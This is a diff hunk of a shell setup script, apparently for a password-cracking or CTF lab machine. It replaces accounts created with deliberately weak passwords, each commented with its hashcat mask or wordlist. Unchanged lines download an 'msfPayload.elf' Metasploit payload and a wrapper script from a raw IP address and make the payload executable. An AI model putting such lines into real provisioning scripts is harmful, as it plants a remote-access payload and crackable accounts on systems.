@@ -74,11 +74,9 @@ apt-get install -y xfce4 xfce4-goodies
 updatedb
 # Start guac service
 service guacd start
-printf "password\npassword\n\n\n\n\n\n\n\n" | adduser joshua # wordlist, simple
-printf "afccdeg8\nafccdeg8\n\n\n\n\n\n\n\n" | adduser alyssa # brute-force, matches ?l?l?l?l?l?l?l?d, easy match
-printf "#mangochocolate\n#mangochocolate\n\n\n\n\n\n\n\n" | adduser rajj # wordlist, end of rockyou
-printf "morecats\nmorecats\n\n\n\n\n\n\n\n" | adduser jamie # wordlist, end of password.lst
-printf "hello??\nhello??\n\n\n\n\n\n\n\n" | adduser maurice # brute-force, matches ?l?l?l?l?l?s?s
+printf "2441231\n2441231\n\n\n\n\n\n\n\n" | adduser alyssa # hashcat - brute-force, matches ?d?d?d?d?d?d?d, easy match
+printf "Kghananer1234\nKghananer1234\n\n\n\n\n\n\n\n" | adduser falcon # hashcat - brute-force, matched ?u?l?l?l?l?l?l?l?l?d?d?d?d, long mask match
+printf "vprana_1\nvprana_1\n\n\n\n\n\n\n\n" | adduser rajj # hashcat - brute-force, matched ?l?l?l?l?l?l?s?d, medium mask match
 wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf" -O /root/msfPayload.elf
 chmod +x /root/msfPayload.elf
 wget "http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh" -O /root/linuxWrapperMSF.sh
